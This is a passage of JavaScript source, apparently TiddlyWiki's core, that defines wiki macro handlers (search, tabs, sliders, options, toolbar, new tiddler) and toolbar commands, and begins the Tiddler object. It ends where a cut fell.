config.macros.list.touched.handler = function(params)
{
	return store.getTouched();
};

config.macros.allTags.handler = function(place,macroName,params)
{
	var tags = store.getTags(params[0]);
	var ul = createTiddlyElement(place,"ul");
	if(tags.length == 0)
		createTiddlyElement(ul,"li",null,"listTitle",this.noTags);
	for(var t=0; t<tags.length; t++) {
		var title = tags[t][0];
		var info = getTiddlyLinkInfo(title);
		var li =createTiddlyElement(ul,"li");
		var btn = createTiddlyButton(li,title + " (" + tags[t][1] + ")",this.tooltip.format([title]),onClickTag,info.classes);
		btn.setAttribute("tag",title);
		btn.setAttribute("refresh","link");
		btn.setAttribute("tiddlyLink",title);
	}
};

config.macros.timeline.handler = function(place,macroName,params)
{
	var field = params[0] ? params[0] : "modified";
	var tiddlers = store.reverseLookup("tags","excludeLists",false,field);
	var lastDay = "";
	var last = params[1] ? tiddlers.length-Math.min(tiddlers.length,parseInt(params[1])) : 0;
	for(var t=tiddlers.length-1; t>=last; t--) {
		var tiddler = tiddlers[t];
		var theDay = tiddler[field].convertToLocalYYYYMMDDHHMM().substr(0,8);
		if(theDay != lastDay) {
			var theDateList = document.createElement("ul");
			place.appendChild(theDateList);
			createTiddlyElement(theDateList,"li",null,"listTitle",tiddler[field].formatString(this.dateFormat));
			lastDay = theDay;
		}
		var theDateListItem = createTiddlyElement(theDateList,"li",null,"listLink");
		theDateListItem.appendChild(createTiddlyLink(place,tiddler.title,true));
	}
};

config.macros.search.handler = function(place,macroName,params)
{
	var searchTimeout = null;
	var btn = createTiddlyButton(place,this.label,this.prompt,this.onClick);
	var txt = createTiddlyElement(place,"input",null,"txtOptionInput");
	if(params[0])
		txt.value = params[0];
	txt.onkeyup = this.onKeyPress;
	txt.onfocus = this.onFocus;
	txt.setAttribute("size",this.sizeTextbox);
	txt.setAttribute("accessKey",this.accessKey);
	txt.setAttribute("autocomplete","off");
	txt.setAttribute("lastSearchText","");
	if(config.browser.isSafari) {
		txt.setAttribute("type","search");
		txt.setAttribute("results","5");
	} else {
		txt.setAttribute("type","text");
	}
};

// Global because there's only ever one outstanding incremental search timer
config.macros.search.timeout = null;

config.macros.search.doSearch = function(txt)
{
	if(txt.value.length > 0) {
		story.search(txt.value,config.options.chkCaseSensitiveSearch,config.options.chkRegExpSearch);
		txt.setAttribute("lastSearchText",txt.value);
	}
};

config.macros.search.onClick = function(e)
{
	config.macros.search.doSearch(this.nextSibling);
	return false;
};

config.macros.search.onKeyPress = function(e)
{
	if(!e) var e = window.event;
	switch(e.keyCode) {
		case 13: // Ctrl-Enter
		case 10: // Ctrl-Enter on IE PC
			config.macros.search.doSearch(this);
			break;
		case 27: // Escape
			this.value = "";
			clearMessage();
			break;
	}
	if(this.value.length > 2) {
		if(this.value != this.getAttribute("lastSearchText")) {
			if(config.macros.search.timeout)
				clearTimeout(config.macros.search.timeout);
			var txt = this;
			config.macros.search.timeout = setTimeout(function() {config.macros.search.doSearch(txt);},500);
		}
	} else {
		if(config.macros.search.timeout)
			clearTimeout(config.macros.search.timeout);
	}
};

config.macros.search.onFocus = function(e)
{
	this.select();
};

config.macros.tiddler.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	params = paramString.parseParams("name",null,true,false,true);
	var names = params[0]["name"];
	var tiddlerName = names[0];
	var className = names[1] ? names[1] : null;
	var args = params[0]["with"];
	var wrapper = createTiddlyElement(place,"span",null,className);
	if(!args) {
		wrapper.setAttribute("refresh","content");
		wrapper.setAttribute("tiddler",tiddlerName);
	}
	var text = store.getTiddlerText(tiddlerName);
	if(text) {
		var stack = config.macros.tiddler.tiddlerStack;
		if(stack.indexOf(tiddlerName) !== -1)
			return;
		stack.push(tiddlerName);
		try {
			var n = args ? Math.min(args.length,9) : 0;
			for(var i=0; i<n; i++) {
				var placeholderRE = new RegExp("\\$" + (i + 1),"mg");
				text = text.replace(placeholderRE,args[i]);
			}
			config.macros.tiddler.renderText(wrapper,text,tiddlerName,params);
		} finally {
			stack.pop();
		}
	}
};

config.macros.tiddler.renderText = function(place,text,tiddlerName,params) 
{
	wikify(text,place,null,store.getTiddler(tiddlerName));
};

config.macros.tiddler.tiddlerStack = [];

config.macros.tag.handler = function(place,macroName,params)
{
	createTagButton(place,params[0]);
};

config.macros.tags.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	params = paramString.parseParams("anon",null,true,false,false);
	var theList = createTiddlyElement(place,"ul");
	var title = getParam(params,"anon","");
	if(title && store.tiddlerExists(title))
		tiddler = store.getTiddler(title);
	var sep = getParam(params,"sep"," ");
	var lingo = config.views.wikified.tag;
	var prompt = tiddler.tags.length == 0 ? lingo.labelNoTags : lingo.labelTags;
	createTiddlyElement(theList,"li",null,"listTitle",prompt.format([tiddler.title]));
	for(var t=0; t<tiddler.tags.length; t++) {
		createTagButton(createTiddlyElement(theList,"li"),tiddler.tags[t],tiddler.title);
		if(t<tiddler.tags.length-1)
			createTiddlyText(theList,sep);
	}
};

config.macros.tagging.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	params = paramString.parseParams("anon",null,true,false,false);
	var theList = createTiddlyElement(place,"ul");
	var title = getParam(params,"anon","");
	if(title == "" && tiddler instanceof Tiddler)
		title = tiddler.title;
	var sep = getParam(params,"sep"," ");
	theList.setAttribute("title",this.tooltip.format([title]));
	var tagged = store.getTaggedTiddlers(title);
	var prompt = tagged.length == 0 ? this.labelNotTag : this.label;
	createTiddlyElement(theList,"li",null,"listTitle",prompt.format([title,tagged.length]));
	for(var t=0; t<tagged.length; t++) {
		createTiddlyLink(createTiddlyElement(theList,"li"),tagged[t].title,true);
		if(t<tagged.length-1)
			createTiddlyText(theList,sep);
	}
};

config.macros.closeAll.handler = function(place)
{
	createTiddlyButton(place,this.label,this.prompt,this.onClick);
};

config.macros.closeAll.onClick = function(e)
{
	story.closeAllTiddlers();
	return false;
};

config.macros.permaview.handler = function(place)
{
	createTiddlyButton(place,this.label,this.prompt,this.onClick);
};

config.macros.permaview.onClick = function(e)
{
	story.permaView();
	return false;
};

config.macros.saveChanges.handler = function(place)
{
	if(!readOnly)
		createTiddlyButton(place,this.label,this.prompt,this.onClick,null,null,this.accessKey);
};

config.macros.saveChanges.onClick = function(e)
{
	saveChanges();
	return false;
};

config.macros.slider.onClickSlider = function(e)
{
	if(!e) var e = window.event;
	var n = this.nextSibling;
	var cookie = n.getAttribute("cookie");
	var isOpen = n.style.display != "none";
	if(config.options.chkAnimate && anim && typeof Slider == "function")
		anim.startAnimating(new Slider(n,!isOpen,null,"none"));
	else
		n.style.display = isOpen ? "none" : "block";
	config.options[cookie] = !isOpen;
	saveOptionCookie(cookie);
	return false;
};

config.macros.slider.createSlider = function(place,cookie,title,tooltip)
{
	var cookie = cookie ? cookie : "";
	var btn = createTiddlyButton(place,title,tooltip,this.onClickSlider);
	var panel = createTiddlyElement(null,"div",null,"sliderPanel");
	panel.setAttribute("cookie",cookie);
	panel.style.display = config.options[cookie] ? "block" : "none";
	place.appendChild(panel);
	return panel;
};

config.macros.slider.handler = function(place,macroName,params)
{
	var panel = this.createSlider(place,params[0],params[2],params[3]);
	var text = store.getTiddlerText(params[1]);
	panel.setAttribute("refresh","content");
	panel.setAttribute("tiddler",params[1]);
	if(text)
		wikify(text,panel,null,store.getTiddler(params[1]));
};

config.macros.option.genericCreate = function(place,type,opt,className,desc)
{
	var typeInfo = config.macros.option.types[type];
	var c = document.createElement(typeInfo.elementType);
	if(typeInfo.typeValue)
		c.setAttribute("type",typeInfo.typeValue);
	c[typeInfo.eventName] = typeInfo.onChange;
	c.setAttribute("option",opt);
	if(className)
		c.className = className;
	else
		c.className = typeInfo.className;
	if(config.optionsDesc[opt])
		c.setAttribute("title",config.optionsDesc[opt]);
	place.appendChild(c);
	if(desc != "no")
		createTiddlyText(place,config.optionsDesc[opt] ? config.optionsDesc[opt] : opt);
	c[typeInfo.valueField] = config.options[opt];
	return c;
};

config.macros.option.genericOnChange = function(e)
{
	var opt = this.getAttribute("option");
	if(opt) {
		var optType = opt.substr(0,3);
		var handler = config.macros.option.types[optType];
		if (handler.elementType && handler.valueField)
			config.macros.option.propagateOption(opt,handler.valueField,this[handler.valueField],handler.elementType);
		}
	return true;
};

config.macros.option.types = {
	'txt': {
		elementType: "input",
		valueField: "value",
		eventName: "onkeyup",
		className: "txtOptionInput",
		create: config.macros.option.genericCreate,
		onChange: config.macros.option.genericOnChange
	},
	'chk': {
		elementType: "input",
		valueField: "checked",
		eventName: "onclick",
		className: "chkOptionInput",
		typeValue: "checkbox",
		create: config.macros.option.genericCreate,
		onChange: config.macros.option.genericOnChange
	}
};

config.macros.option.propagateOption = function(opt,valueField,value,elementType)
{
	config.options[opt] = value;
	saveOptionCookie(opt);
	var nodes = document.getElementsByTagName(elementType);
	for(var t=0; t<nodes.length; t++) {
		var optNode = nodes[t].getAttribute("option");
		if(opt == optNode)
			nodes[t][valueField] = value;
		}
};

config.macros.option.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	params = paramString.parseParams("anon",null,true,false,false);
	var opt = (params[1] && params[1].name == "anon") ? params[1].value : getParam(params,"name",null);
	var className = (params[2] && params[2].name == "anon") ? params[2].value : getParam(params,"class",null);
	var desc = getParam(params,"desc","no");
	var type = opt.substr(0,3);
	var h = config.macros.option.types[type];
	if (h && h.create)
		h.create(place,type,opt,className,desc);
};

config.macros.options.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	params = paramString.parseParams("anon",null,true,false,false);
	var showUnknown = getParam(params,"showUnknown","no");
	var wizard = new Wizard();
	wizard.createWizard(place,this.wizardTitle);
	wizard.addStep(this.step1Title,this.step1Html);
	var markList = wizard.getElement("markList");
	var chkUnknown = wizard.getElement("chkUnknown");
	chkUnknown.checked = showUnknown == "yes";
	chkUnknown.onchange = this.onChangeUnknown;
	var listWrapper = document.createElement("div");
	markList.parentNode.insertBefore(listWrapper,markList);
	wizard.setValue("listWrapper",listWrapper);
	this.refreshOptions(listWrapper,showUnknown == "yes");
};

config.macros.options.refreshOptions = function(listWrapper,showUnknown)
{	
	var opts = [];
	for(var n in config.options) {
		var opt = {};
		opt.option = "";
		opt.name = n;
		opt.lowlight = !config.optionsDesc[n];
		opt.description = opt.lowlight ? this.unknownDescription : config.optionsDesc[n];
		if(!opt.lowlight || showUnknown)
			opts.push(opt);
	}
	opts.sort(function(a,b) {return a.name.substr(3) < b.name.substr(3) ? -1 : (a.name.substr(3) == b.name.substr(3) ? 0 : +1);});
	var listview = ListView.create(listWrapper,opts,this.listViewTemplate);
	for(n=0; n<opts.length; n++) {
		var type = opts[n].name.substr(0,3);
		var h = config.macros.option.types[type];
		if (h && h.create) {
			h.create(opts[n].colElements['option'],type,opts[n].name,null,"no");
		}
	}
};

config.macros.options.onChangeUnknown = function(e)
{
	var wizard = new Wizard(this);
	var listWrapper = wizard.getValue("listWrapper");
	removeChildren(listWrapper);
	config.macros.options.refreshOptions(listWrapper,this.checked);
	return false;
};

config.macros.newTiddler.createNewTiddlerButton = function(place,title,params,label,prompt,accessKey,newFocus,isJournal)
{
	var tags = [];
	for(var t=1; t<params.length; t++) {
		if((params[t].name == "anon" && t != 1) || (params[t].name == "tag"))
			tags.push(params[t].value);
	}
	label = getParam(params,"label",label);
	prompt = getParam(params,"prompt",prompt);
	accessKey = getParam(params,"accessKey",accessKey);
	newFocus = getParam(params,"focus",newFocus);
	var customFields = getParam(params,"fields","");
	if(!customFields && !store.isShadowTiddler(title))
		customFields = String.encodeHashMap(config.defaultCustomFields);
	var btn = createTiddlyButton(place,label,prompt,this.onClickNewTiddler,null,null,accessKey);
	btn.setAttribute("newTitle",title);
	btn.setAttribute("isJournal",isJournal ? "true" : "false");
	if(tags.length > 0)
		btn.setAttribute("params",tags.join("|"));
	btn.setAttribute("newFocus",newFocus);
	btn.setAttribute("newTemplate",getParam(params,"template",DEFAULT_EDIT_TEMPLATE));
	if(customFields !== "")
		btn.setAttribute("customFields",customFields);
	var text = getParam(params,"text");
	if(text !== undefined) 
		btn.setAttribute("newText",text);
	return btn;
};

config.macros.newTiddler.onClickNewTiddler = function()
{
	var title = this.getAttribute("newTitle");
	if(this.getAttribute("isJournal") == "true") {
		var now = new Date();
		title = now.formatString(title.trim());
	}
	var params = this.getAttribute("params");
	var tags = params ? params.split("|") : [];
	var focus = this.getAttribute("newFocus");
	var template = this.getAttribute("newTemplate");
	var customFields = this.getAttribute("customFields");
	story.displayTiddler(null,title,template,false,null,null);
	var tiddlerElem = document.getElementById(story.idPrefix + title);
	if(customFields)
		story.addCustomFields(tiddlerElem,customFields);
	var text = this.getAttribute("newText");
	if(typeof text == "string")
		story.getTiddlerField(title,"text").value = text.format([title]);
	for(var t=0;t<tags.length;t++)
		story.setTiddlerTag(title,tags[t],+1);
	story.focusTiddler(title,focus);
	return false;
};

config.macros.newTiddler.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	if(!readOnly) {
		params = paramString.parseParams("anon",null,true,false,false);
		var title = params[1] && params[1].name == "anon" ? params[1].value : this.title;
		title = getParam(params,"title",title);
		this.createNewTiddlerButton(place,title,params,this.label,this.prompt,this.accessKey,"title",false);
	}
};

config.macros.newJournal.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	if(!readOnly) {
		params = paramString.parseParams("anon",null,true,false,false);
		var title = params[1] && params[1].name == "anon" ? params[1].value : "";
		title = getParam(params,"title",title);
		config.macros.newTiddler.createNewTiddlerButton(place,title,params,this.label,this.prompt,this.accessKey,"text",true);
	}
};

config.macros.sparkline.handler = function(place,macroName,params)
{
	var data = [];
	var min = 0;
	var max = 0;
	for(var t=0; t<params.length; t++) {
		var v = parseInt(params[t]);
		if(v < min)
			min = v;
		if(v > max)
			max = v;
		data.push(v);
	}
	if(data.length < 1)
		return;
	var box = createTiddlyElement(place,"span",null,"sparkline",String.fromCharCode(160));
	box.title = data.join(",");
	var w = box.offsetWidth;
	var h = box.offsetHeight;
	box.style.paddingRight = (data.length * 2 - w) + "px";
	box.style.position = "relative";
	for(var d=0; d<data.length; d++) {
		var tick = document.createElement("img");
		tick.border = 0;
		tick.className = "sparktick";
		tick.style.position = "absolute";
		tick.src = "data:image/gif,GIF89a%01%00%01%00%91%FF%00%FF%FF%FF%00%00%00%C0%C0%C0%00%00%00!%F9%04%01%00%00%02%00%2C%00%00%00%00%01%00%01%00%40%02%02T%01%00%3B";
		tick.style.left = d*2 + "px";
		tick.style.width = "2px";
		var v = Math.floor(((data[d] - min)/(max-min)) * h);
		tick.style.top = (h-v) + "px";
		tick.style.height = v + "px";
		box.appendChild(tick);
	}
};

config.macros.tabs.handler = function(place,macroName,params)
{
	var cookie = params[0];
	var numTabs = (params.length-1)/3;
	var wrapper = createTiddlyElement(null,"div",null,cookie);
	var tabset = createTiddlyElement(wrapper,"div",null,"tabset");
	tabset.setAttribute("cookie",cookie);
	var validTab = false;
	for(var t=0; t<numTabs; t++) {
		var label = params[t*3+1];
		var prompt = params[t*3+2];
		var content = params[t*3+3];
		var tab = createTiddlyButton(tabset,label,prompt,this.onClickTab,"tab tabUnselected");
		tab.setAttribute("tab",label);
		tab.setAttribute("content",content);
		tab.title = prompt;
		if(config.options[cookie] == label)
			validTab = true;
	}
	if(!validTab)
		config.options[cookie] = params[1];
	place.appendChild(wrapper);
	this.switchTab(tabset,config.options[cookie]);
};

config.macros.tabs.onClickTab = function(e)
{
	config.macros.tabs.switchTab(this.parentNode,this.getAttribute("tab"));
	return false;
};

config.macros.tabs.switchTab = function(tabset,tab)
{
	var cookie = tabset.getAttribute("cookie");
	var theTab = null;
	var nodes = tabset.childNodes;
	for(var t=0; t<nodes.length; t++) {
		if(nodes[t].getAttribute && nodes[t].getAttribute("tab") == tab) {
			theTab = nodes[t];
			theTab.className = "tab tabSelected";
		} else {
			nodes[t].className = "tab tabUnselected";
		}
	}
	if(theTab) {
		if(tabset.nextSibling && tabset.nextSibling.className == "tabContents")
			removeNode(tabset.nextSibling);
		var tabContent = createTiddlyElement(null,"div",null,"tabContents");
		tabset.parentNode.insertBefore(tabContent,tabset.nextSibling);
		var contentTitle = theTab.getAttribute("content");
		wikify(store.getTiddlerText(contentTitle),tabContent,null,store.getTiddler(contentTitle));
		if(cookie) {
			config.options[cookie] = tab;
			saveOptionCookie(cookie);
		}
	}
};

// <<gradient [[tiddler name]] vert|horiz rgb rgb rgb rgb... >>
config.macros.gradient.handler = function(place,macroName,params,wikifier)
{
	var terminator = ">>";
	var panel;
	if(wikifier)
		panel = createTiddlyElement(place,"div",null,"gradient");
	else
		panel = place;
	panel.style.position = "relative";
	panel.style.overflow = "hidden";
	panel.style.zIndex = "0";
	var t;
	if(wikifier) {
		var styles = config.formatterHelpers.inlineCssHelper(wikifier);
		config.formatterHelpers.applyCssHelper(panel,styles);
	}
	var colours = [];
	for(t=1; t<params.length; t++) {
		var c = new RGB(params[t]);
		if(c)
			colours.push(c);
	}
	drawGradient(panel,params[0] != "vert",colours);
	if(wikifier)
		wikifier.subWikify(panel,terminator);
	if(document.all) {
		panel.style.height = "100%";
		panel.style.width = "100%";
	}
};

config.macros.message.handler = function(place,macroName,params)
{
	if(params[0]) {
		var m = config;
		var p = params[0].split(".");
		for(var t=0; t<p.length; t++) {
			if(p[t] in m)
				m = m[p[t]];
			else
				break;
		}
		createTiddlyText(place,m.toString().format(params.splice(1)));
	}
};

config.macros.view.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	if((tiddler instanceof Tiddler) && params[0]) {
		var value = store.getValue(tiddler,params[0]);
		if(value != undefined) {
			switch(params[1]) {
				case undefined:
					highlightify(value,place,highlightHack,tiddler);
					break;
				case "link":
					createTiddlyLink(place,value,true);
					break;
				case "wikified":
					wikify(value,place,highlightHack,tiddler);
					break;
				case "date":
					value = Date.convertFromYYYYMMDDHHMM(value);
					createTiddlyText(place,value.formatString(params[2] ? params[2] : config.views.wikified.dateFormat));
					break;
			}
		}
	}
};

config.macros.edit.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	var field = params[0];
	var rows = params[1];
	if((tiddler instanceof Tiddler) && field) {
		story.setDirty(tiddler.title,true);
		if(field != "text" && !rows) {
			var e = createTiddlyElement(null,"input");
			if(tiddler.isReadOnly())
				e.setAttribute("readOnly","readOnly");
			e.setAttribute("edit",field);
			e.setAttribute("type","text");
			var v = store.getValue(tiddler,field);
			if(!v) 
				v = "";
			e.value = v;
			e.setAttribute("size","40");
			e.setAttribute("autocomplete","off");
			place.appendChild(e);
		} else {
			var wrapper1 = createTiddlyElement(null,"fieldset",null,"fieldsetFix");
			var wrapper2 = createTiddlyElement(wrapper1,"div");
			var e = createTiddlyElement(wrapper2,"textarea");
			if(tiddler.isReadOnly())
				e.setAttribute("readOnly","readOnly");
			var v = store.getValue(tiddler,field);
			if(!v) 
				v = "";
			e.value = v;
			var rows = rows ? rows : 10;
			var lines = v.match(/\n/mg);
			var maxLines = Math.max(parseInt(config.options.txtMaxEditRows),5);
			if(lines != null && lines.length > rows)
				rows = lines.length + 5;
			rows = Math.min(rows,maxLines);
			e.setAttribute("rows",rows);
			e.setAttribute("edit",field);
			place.appendChild(wrapper1);
		}
	}
};

config.macros.tagChooser.onClick = function(e)
{
	if(!e) var e = window.event;
	var lingo = config.views.editor.tagChooser;
	var popup = Popup.create(this);
	var tags = store.getTags();
	if(tags.length == 0)
		createTiddlyText(createTiddlyElement(popup,"li"),lingo.popupNone);
	for(var t=0; t<tags.length; t++) {
		var theTag = createTiddlyButton(createTiddlyElement(popup,"li"),tags[t][0],lingo.tagTooltip.format([tags[t][0]]),config.macros.tagChooser.onTagClick);
		theTag.setAttribute("tag",tags[t][0]);
		theTag.setAttribute("tiddler",this.getAttribute("tiddler"));
	}
	Popup.show();
	e.cancelBubble = true;
	if(e.stopPropagation) e.stopPropagation();
	return false;
};

config.macros.tagChooser.onTagClick = function(e)
{
	if(!e) var e = window.event;
	var tag = this.getAttribute("tag");
	var title = this.getAttribute("tiddler");
	if(!readOnly)
		story.setTiddlerTag(title,tag,0);
	return false;
};

config.macros.tagChooser.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	if(tiddler instanceof Tiddler) {
		var title = tiddler.title;
		var lingo = config.views.editor.tagChooser;
		var btn = createTiddlyButton(place,lingo.text,lingo.tooltip,this.onClick);
		btn.setAttribute("tiddler",title);
	}
};

// Create a toolbar command button
config.macros.toolbar.createCommand = function(place,commandName,tiddler,theClass)
{
	if(typeof commandName != "string") {
		var c = null;
		for(var t in config.commands) {
			if(config.commands[t] == commandName)
				c = t;
		}
		commandName = c;
	}
	if((tiddler instanceof Tiddler) && (typeof commandName == "string")) {
		var command = config.commands[commandName];
		if(command.isEnabled ? command.isEnabled(tiddler) : this.isCommandEnabled(command,tiddler)) {
			var text = command.getText ? command.getText(tiddler) : this.getCommandText(command,tiddler);
			var tooltip = command.getTooltip ? command.getTooltip(tiddler) : this.getCommandTooltip(command,tiddler);
			var cmd;
			switch(command.type) {
				case "popup":
					cmd = this.onClickPopup;
					break;
				case "command":
				default:
					cmd = this.onClickCommand;
					break;
			}
			var btn = createTiddlyButton(null,text,tooltip,cmd);
			btn.setAttribute("commandName",commandName);
			btn.setAttribute("tiddler",tiddler.title);
			if(theClass)
				addClass(btn,theClass);
			place.appendChild(btn);
		}
	}
};

config.macros.toolbar.isCommandEnabled = function(command,tiddler)
{
	var title = tiddler.title;
	var ro = tiddler.isReadOnly();
	var shadow = store.isShadowTiddler(title) && !store.tiddlerExists(title);
	return (!ro || (ro && !command.hideReadOnly)) && !(shadow && command.hideShadow);
};

config.macros.toolbar.getCommandText = function(command,tiddler)
{
	return tiddler.isReadOnly() && command.readOnlyText ? command.readOnlyText : command.text;
};

config.macros.toolbar.getCommandTooltip = function(command,tiddler)
{
	return tiddler.isReadOnly() && command.readOnlyTooltip ? command.readOnlyTooltip : command.tooltip;
};

config.macros.toolbar.onClickCommand = function(e)
{
	if(!e) var e = window.event;
	e.cancelBubble = true;
	if (e.stopPropagation) e.stopPropagation();
	var command = config.commands[this.getAttribute("commandName")];
	return command.handler(e,this,this.getAttribute("tiddler"));
};

config.macros.toolbar.onClickPopup = function(e)
{
	if(!e) var e = window.event;
	e.cancelBubble = true;
	if (e.stopPropagation) e.stopPropagation();
	var popup = Popup.create(this);
	var command = config.commands[this.getAttribute("commandName")];
	var title = this.getAttribute("tiddler");
	var tiddler = store.fetchTiddler(title);
	popup.setAttribute("tiddler",title);
	command.handlePopup(popup,title);
	Popup.show();
	return false;
};

// Invoke the first command encountered from a given place that is tagged with a specified class
config.macros.toolbar.invokeCommand = function(place,theClass,event)
{
	var children = place.getElementsByTagName("a");
	for(var t=0; t<children.length; t++) {
		var c = children[t];
		if(hasClass(c,theClass) && c.getAttribute && c.getAttribute("commandName")) {
			if(c.onclick instanceof Function)
				c.onclick.call(c,event);
			break;
		}
	}
};

config.macros.toolbar.onClickMore = function(e)
{
	var e = this.nextSibling;
	e.style.display = "inline";
	removeNode(this);
	return false;
};

config.macros.toolbar.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	for(var t=0; t<params.length; t++) {
		var c = params[t];
		switch(c) {
			case '>':
				var btn = createTiddlyButton(place,this.moreLabel,this.morePrompt,config.macros.toolbar.onClickMore);
				addClass(btn,"moreCommand");
				var e = createTiddlyElement(place,"span",null,"moreCommand");
				e.style.display = "none";
				place = e;
				break;
			default:
				var theClass = "";
				switch(c.substr(0,1)) {
					case "+":
						theClass = "defaultCommand";
						c = c.substr(1);
						break;
					case "-":
						theClass = "cancelCommand";
						c = c.substr(1);
						break;
				}
				if(c in config.commands)
					this.createCommand(place,c,tiddler,theClass);
				break;
		}
	}
};

config.macros.refreshDisplay.handler = function(place)
{
	createTiddlyButton(place,this.label,this.prompt,this.onClick);
};

config.macros.refreshDisplay.onClick = function(e)
{
	refreshAll();
	return false;
};

config.macros.annotations.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	var title = tiddler ? tiddler.title : null;
	var a = title ? config.annotations[title] : null;
	if(!tiddler || !title || !a)
		return;
	var text = a.format([title]);
	wikify(text,createTiddlyElement(place,"div",null,"annotation"),null,tiddler);
};

//--
//-- Menu and toolbar commands
//--

config.commands.closeTiddler.handler = function(event,src,title)
{
	story.closeTiddler(title,true);
	return false;
};

config.commands.closeOthers.handler = function(event,src,title)
{
	story.closeAllTiddlers(title);
	return false;
};

config.commands.editTiddler.handler = function(event,src,title)
{
	clearMessage();
	var tiddlerElem = document.getElementById(story.idPrefix + title);
	var fields = tiddlerElem.getAttribute("tiddlyFields");
	story.displayTiddler(null,title,DEFAULT_EDIT_TEMPLATE,false,null,fields);
	story.focusTiddler(title,"text");
	return false;
};

config.commands.saveTiddler.handler = function(event,src,title)
{
	var newTitle = story.saveTiddler(title,event.shiftKey);
	if(newTitle)
		story.displayTiddler(null,newTitle);
	return false;
};

config.commands.cancelTiddler.handler = function(event,src,title)
{
	if(story.hasChanges(title) && !readOnly) {
		if(!confirm(this.warning.format([title])))
			return false;
	}
	story.setDirty(title,false);
	story.displayTiddler(null,title);
	return false;
};

config.commands.deleteTiddler.handler = function(event,src,title)
{
	var deleteIt = true;
	if (config.options.chkConfirmDelete)
		deleteIt = confirm(this.warning.format([title]));
	if (deleteIt) {
		store.removeTiddler(title);
		story.closeTiddler(title,true);
		autoSaveChanges();
	}
	return false;
};

config.commands.permalink.handler = function(event,src,title)
{
	var t = encodeURIComponent(String.encodeTiddlyLink(title));
	if(window.location.hash != t)
		window.location.hash = t;
	return false;
};

config.commands.references.handlePopup = function(popup,title)
{
	var references = store.getReferringTiddlers(title);
	var c = false;
	for(var r=0; r<references.length; r++) {
		if(references[r].title != title && !references[r].isTagged("excludeLists")) {
			createTiddlyLink(createTiddlyElement(popup,"li"),references[r].title,true);
			c = true;
		}
	}
	if(!c)
		createTiddlyText(createTiddlyElement(popup,"li",null,"disabled"),this.popupNone);
};

config.commands.jump.handlePopup = function(popup,title)
{
	story.forEachTiddler(function(title,element) {
		createTiddlyLink(createTiddlyElement(popup,"li"),title,true,null,false,null,true);
		});
};

config.commands.syncing.handlePopup = function(popup,title)
{
	var tiddler = store.fetchTiddler(title);
	if(!tiddler)
		return;
	var serverType = tiddler.getServerType();
	var serverHost = tiddler.fields['server.host'];
	var serverWorkspace = tiddler.fields['server.workspace'];
	if(!serverWorkspace)
		serverWorkspace = "";
	if(serverType) {
		var e = createTiddlyElement(popup,"li",null,"popupMessage");
		e.innerHTML = config.commands.syncing.currentlySyncing.format([serverType,serverHost,serverWorkspace]);
	} else {
		createTiddlyElement(popup,"li",null,"popupMessage",config.commands.syncing.notCurrentlySyncing);
	}
	if(serverType) {
		createTiddlyElement(createTiddlyElement(popup,"li",null,"listBreak"),"div");
		var btn = createTiddlyButton(createTiddlyElement(popup,"li"),this.captionUnSync,null,config.commands.syncing.onChooseServer);
		btn.setAttribute("tiddler",title);
		btn.setAttribute("server.type","");
	}
	createTiddlyElement(createTiddlyElement(popup,"li",null,"listBreak"),"div");
	createTiddlyElement(popup,"li",null,"popupMessage",config.commands.syncing.chooseServer);
	var feeds = store.getTaggedTiddlers("systemServer","title");
	for(var t=0; t<feeds.length; t++) {
		var f = feeds[t];
		var feedServerType = store.getTiddlerSlice(f.title,"Type");
		if(!feedServerType)
			feedServerType = "file";
		var feedServerHost = store.getTiddlerSlice(f.title,"URL");
		if(!feedServerHost)
			feedServerHost = "";
		var feedServerWorkspace = store.getTiddlerSlice(f.title,"Workspace");
		if(!feedServerWorkspace)
			feedServerWorkspace = "";
		var caption = f.title;
		if(serverType == feedServerType && serverHost == feedServerHost && serverWorkspace == feedServerWorkspace) {
			caption = config.commands.syncing.currServerMarker + caption;
		} else {
			caption = config.commands.syncing.notCurrServerMarker + caption;
		}
		btn = createTiddlyButton(createTiddlyElement(popup,"li"),caption,null,config.commands.syncing.onChooseServer);
		btn.setAttribute("tiddler",title);
		btn.setAttribute("server.type",feedServerType);
		btn.setAttribute("server.host",feedServerHost);
		btn.setAttribute("server.workspace",feedServerWorkspace);
	}
};

config.commands.syncing.onChooseServer = function(e)
{
	var tiddler = this.getAttribute("tiddler");
	var serverType = this.getAttribute("server.type");
	if(serverType) {
		store.addTiddlerFields(tiddler,{
			'server.type': serverType,
			'server.host': this.getAttribute("server.host"),
			'server.workspace': this.getAttribute("server.workspace")
			});
	} else {
		store.setValue(tiddler,'server',null);
	}
	return false;
};

config.commands.fields.handlePopup = function(popup,title)
{
	var tiddler = store.fetchTiddler(title);
	if(!tiddler)
		return;
	var fields = {};
	store.forEachField(tiddler,function(tiddler,fieldName,value) {fields[fieldName] = value;},true);
	var items = [];
	for(var t in fields) {
		items.push({field: t,value: fields[t]});
	}
	items.sort(function(a,b) {return a.field < b.field ? -1 : (a.field == b.field ? 0 : +1);});
	if(items.length > 0)
		ListView.create(popup,items,this.listViewTemplate);
	else
		createTiddlyElement(popup,"div",null,null,this.emptyText);
};

//--
//-- Tiddler() object
//--

function Tiddler(title)
{
	this.title = title;
	this.text = null;
	this.modifier = null;
	this.modified = new Date();
	this.created = new Date();
	this.links = [];
	this.linksUpdated = false;
	this.tags = [];
	this.fields = {};
	return this;
}

Tiddler.prototype.getLinks = function()
{
	if(this.linksUpdated==false)
		this.changed();
	return this.links;
};

// Returns the fields that are inherited in string field:"value" field2:"value2" format
Tiddler.prototype.getInheritedFields = function()
{
	var f = {};
	for(i in this.fields) {
		if(i=="server.host" || i=="server.workspace" || i=="wikiformat"|| i=="server.type") {
			f[i] = this.fields[i];
		}
	}
	return String.encodeHashMap(f);
};

// Increment the changeCount of a tiddler
Tiddler.prototype.incChangeCount = function()
{
	var c = this.fields['changecount'];
	c = c ? parseInt(c) : 0;
	this.fields['changecount'] = String(c+1);
};

// Clear the changeCount of a tiddler
